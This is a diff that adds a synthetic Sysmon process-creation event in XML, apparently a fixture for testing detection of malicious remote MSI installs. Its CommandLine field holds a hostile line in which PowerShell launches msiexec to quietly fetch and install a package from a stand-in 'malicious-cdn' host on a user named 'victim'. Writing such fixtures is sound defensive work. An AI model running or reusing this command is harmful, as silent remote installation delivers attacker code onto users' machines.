@@ -1,0 +1,42 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2025-01-15T11:20:00.889900Z" />
+    <EventRecordID>22010</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="1234" ThreadID="5678" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01</Computer>
+    <Security UserID="S-1-5-21-1001" />
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2025-01-15 11:20:00.889</Data>
+    <Data Name="ProcessGuid">{12345678-1234-1234-1234-1234567890aa}</Data>
+    <Data Name="ProcessId">0x2a10</Data>
+    <Data Name="Image">C:\Windows\System32\msiexec.exe</Data>
+    <Data Name="FileVersion">5.0.19041.1</Data>
+    <Data Name="Description">Windows Installer</Data>
+    <Data Name="Product">Microsoft Windows Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">msiexec.exe</Data>
+    <Data Name="CommandLine">msiexec.exe /i https://malicious-cdn.example/setup.msi /quiet /qn</Data>
+    <Data Name="CurrentDirectory">C:\Users\victim\</Data>
+    <Data Name="User">WORKSTATION01\victim</Data>
+    <Data Name="LogonGuid">{12345678-1234-1234-1234-1234567890aa}</Data>
+    <Data Name="LogonId">0x1f4a2</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA256=AA10AA10AA10</Data>
+    <Data Name="ParentProcessGuid">{12345678-1234-1234-1234-1234567890a6}</Data>
+    <Data Name="ParentProcessId">0x1abc</Data>
+    <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="ParentCommandLine">powershell.exe -c msiexec /i</Data>
+  </EventData>
+</Event>
